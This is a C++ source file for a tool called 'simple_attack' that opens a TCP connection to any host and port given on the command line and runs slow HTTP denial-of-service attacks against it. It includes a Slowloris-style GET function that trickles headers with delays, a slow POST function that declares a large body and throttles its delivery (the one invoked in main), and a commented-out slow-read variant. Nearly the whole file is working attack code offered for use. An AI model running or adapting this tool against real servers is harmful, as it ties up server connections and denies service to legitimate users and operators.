#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <iostream>
#include <vector>
#define ERRNOSTR   strerror(errno)
#define error(...) { fprintf(stderr, __VA_ARGS__); exit(1); }
#define VOID(r)    { (void)(r + 1); }
using namespace std;


string host_header;  // HTTP header Host

// Return socket Fd; host can be either hostname or IP address.
// win_size: TCP window size
int connect_TCP(const char* host, unsigned short port, int win_size=-1) {
    struct sockaddr_in addr;
    struct addrinfo* info;
    int sockFd;

    if (getaddrinfo(host, NULL, NULL, &info) == 0) {
        memcpy(&addr, info->ai_addr, sizeof(addr));
        freeaddrinfo(info);
    } else if ((addr.sin_addr.s_addr = inet_addr(host)) == INADDR_NONE) {
        error("Cannot resolve host addr: %s\n", host);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if ((sockFd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        error("Cannot create socket: %s\n", ERRNOSTR);
    }
    if (win_size > 0) {
        int r = setsockopt(sockFd, SOL_SOCKET, SO_RCVBUF, &win_size, sizeof(win_size));
        if (r < 0) error("Cannot set window size: %s\n", ERRNOSTR);
    }
    if ((connect(sockFd, (struct sockaddr*)&addr, sizeof(addr))) < 0) {
        error("Cannot connect to %s (%d): %s\n", inet_ntoa(addr.sin_addr), \
              ntohs(addr.sin_port), ERRNOSTR);
    }
    printf("Connected to %s (%d)\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
    return sockFd;
}

void get_attack(int sock, int delay=3) {
    vector<string> msg = {
        "GET / HTTP/1.1\r\n",
        host_header,
        "User-Agent: a\r\n",
        "Accept: */*\r\n",
        "X-a: 1234\r\n",
        "X-a: 3234\r\n",
        "X-a: 34534545\r\n",
        "X-a: 429548724598457\r\n",
        "\r\n"
    };

    for (string m : msg) {
        VOID(write(sock, m.c_str(), m.size()));
        printf("%s\n", m.c_str());
        sleep(delay);
    }
}

// Send fast at first, then slow down to take 50 sec for finishing the last part.
// form: use form or file-upload as the content-type.
// data_rate: bytes/s
void post_attack(int sock, int iteration=100, bool form=false, int data_rate=600) {
    vector<string> header = {
        "POST / HTTP/1.1\r\n",
        host_header,
        "User-Agent: a\r\n",
        "Accept: */*\r\n",
        "Content-Length: " + to_string((form ? 0 : 193) + data_rate * iteration) + "\r\n",
    };
    if (form) {
        vector<string> tmp = {
            "Content-Type: application/x-www-form-urlencoded\r\n",
            "\r\n",
        };
        for (auto t : tmp) header.push_back(t);
    } else {
        vector<string> tmp = {
            "Expect: 100-continue\r\n",
            "Content-Type: multipart/form-data; boundary=------------------------03b7aa8056b76ef3\r\n",
            "\r\n",
            "--------------------------03b7aa8056b76ef3\r\n",
            "Content-Disposition: form-data; name=\"file\"; filename=\"a\"\r\n",
            "Content-Type: application/octet-stream\r\n",
            "\r\n",
        };
        for (auto t : tmp) header.push_back(t);
    };
    string body;
    string tail = form ? "" : "\r\n--------------------------03b7aa8056b76ef3--\r\n";

    // generate body
    srand(time(NULL));
    for (int i = 0; i < data_rate; i++) {
        body.push_back((char)(rand() % (0x7e - 0x20) + 0x20));
    }

    for (string h : header) {
        VOID(write(sock, h.c_str(), h.size()));
    }
    for (int i = 0; i < iteration; i++) {
        VOID(write(sock, body.c_str(), body.size()));
        printf("[%d / %d] %s...\n", i, iteration, body.substr(0, 80).c_str());
        if (i + 50 >= iteration) {
            sleep(1);
        }
    }
    VOID(write(sock, tail.c_str(), tail.size()));
}

// Make sure to also set TCP window size small
// void read_attack(int sock, string path, int data_rate=600) {
//     vector<string> request = {
//         string("GET ") + ((path[0] != '/') ? "/" : "") + path + " HTTP/1.1\r\n",
//         host_header,
//         "\r\n"
//     };
//     char* buf = (char*)malloc(data_rate);

//     for (auto r : request) {
//         VOID(write(sock, r.c_str(), r.size()));
//     }
//     while (sleep(1) == 0) {
//         printf("%lu: %d\n", time(NULL), read(sock, buf, data_rate));
//     }

//     free(buf);
// }

void read_response(int sock) {
    char buf[1025];

    sleep(1);
    VOID(read(sock, buf, 1024));
    printf("%s\n", buf);
}

void help() {
    auto print_opt = [](auto name, auto des) {
        printf("  %-22s%s\n", name, des);
    };
    printf("Usage: simple_attack [OPTIONS] <host> <port>\n");
    print_opt("host", "The address of the target.");
    print_opt("port", "The port of the target.");

    printf("\nOptions:\n");
    print_opt("-s <size>", "The size of http body in KB. (default=1024)");
    print_opt("-p <path>", "The URL path for read attack. (default=/)");
    print_opt("-h", "Display this help message.");
}

int main(int argc, char* argv[]) {
    int body_size = 1024 * 1024;
    string path = "/";
    char c;
    while ((c = getopt(argc, argv, "s:p:h")) > 0) {
        switch (c) {
        case 's':
            body_size = atoi(optarg) * 1024;
            break;
        case 'p':
            path = string(optarg);
            break;
        case 'h':
            help();
            return 1;
        default:
            return 1;
        }
    }
    // two more positional arguments
    if (optind + 2 > argc) {
        help();
        return 1;
    }
    const char* host = argv[optind++];
    unsigned short port = atoi(argv[optind++]);

    host_header = "Host: " + string(host) + ":" + to_string(port) + "\r\n";
    int sock = connect_TCP(host, port);

    // get_attack(sock);
    post_attack(sock, body_size / 600, true);
    // read_attack(sock, path);

    read_response(sock);
    return 0;
}
